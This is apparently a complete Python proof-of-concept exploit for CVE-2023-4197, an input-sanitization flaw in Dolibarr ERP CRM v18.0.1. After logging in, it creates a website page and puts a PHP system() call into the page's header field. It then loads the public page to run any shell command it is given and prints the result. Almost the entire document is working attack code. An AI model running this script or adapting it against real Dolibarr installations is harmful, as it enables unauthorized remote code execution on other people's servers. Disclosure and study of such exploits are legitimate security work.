# Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197)
# Via: https://TARGET_HOST/website/index.php
# Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)

#!/usr/bin/env python3
import os
import re
import requests
import sys
import uuid
requests.packages.urllib3.disable_warnings()

s = requests.Session()

def check_args():
    global target, username, password, cmd

    print("\n===== Dolibarr ERP CRM (v18.0.1) Improper Input Sanitization Vulnerability (CVE-2023-4197) =====\n")

    if len(sys.argv) != 5:
        print("[!] Please enter the required arguments like so: python3 {} https://TARGET_URL USERNAME PASSWORD CMD_TO_EXECUTE".format(sys.argv[0]))
        sys.exit(1)

    target = sys.argv[1].strip("/")
    username = sys.argv[2]
    password = sys.argv[3]
    cmd = sys.argv[4]

def authenticate():
    global s, csrf_token

    print("[+] Attempting to authenticate...")

    # GET the CSRF token
    res = s.get(f"{target}/", verify=False)
    csrf_token = re.search("\"anti-csrf-newtoken\" content=\"(.+)\"", res.text).group(1).strip()

    # Login
    data = {
        "token": csrf_token,
        "username": username,
        "password": password,
        "actionlogin": "login"
    }
    res = s.post(f"{target}/", data=data, verify=False)

    if "Logout" not in res.text:
        print("[!] Authentication failed! Are the credentials valid?")
        sys.exit(1)
    else:
        print("[+] Authenticated successfully!")

def rce():
    # Create web site
    print("[+] Attempting to create a website...")
    website_name = uuid.uuid4().hex
    data = {
        "WEBSITE_REF": website_name,
        "token": csrf_token,
        "action": "addsite",
        "WEBSITE_LANG": "en",
        "addcontainer": "create"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Website - {website_name}" not in res.text:
        print("[!] Website creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created website name: \"{website_name}\"!")

    # Create web page
    print("[+] Attempting to create a web page...")
    webpage_name = uuid.uuid4().hex
    data = {
        "website": website_name,
        "token": csrf_token,
        "action": "addcontainer",
        "WEBSITE_TYPE_CONTAINER": "page",
        "WEBSITE_TITLE": "x",
        "WEBSITE_PAGENAME": webpage_name
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if f"Contenair \\'{webpage_name}\\' added" not in res.text:
        print("[!] Web page creation failed!")
        sys.exit(1)
    else:
        print(f"[+] Created web page name: \"{webpage_name}\"!")

    # Modify created page
    print("[+] Attempting to modify the web page...")
    webpage_id = re.search(f"<option value=\"(.+)\" .+{webpage_name}", res.text).group(1).strip()
    data = {
        "website": website_name,
        "WEBSITE_PAGENAME": webpage_name,
        "pageid": webpage_id,
        "token": csrf_token,
        "action": "updatemeta",
        "htmlheader": f"<?PHP echo system('{cmd}'); ?>"
    }
    res = s.post(f"{target}/website/index.php", data=data, verify=False)
    if "Saved" not in res.text:
        print("[!] Web page modification failed!")
        sys.exit(1)
    else:
        print("[+] Web page modified successfully!")      

    # Trigger RCE
    print(f"[+] Triggering RCE now via: {target}/public/website/index.php?website={website_name}&pageref={webpage_name}")
    res = s.get(f"{target}/public/website/index.php?website={website_name}&pageref={webpage_name}", verify=False)
    if res.status_code != 200:
        print("[!] Web page is not reachable!")
        sys.exit(1)
    else:
        output = re.findall("block -->\n(.+)</head>", res.text, re.MULTILINE | re.DOTALL)[0].strip()
        print(f"[+] RCE successful! Output of command:\n\n{output}")

def main():
    check_args()
    authenticate()
    rce()

if __name__ == "__main__":
    main()
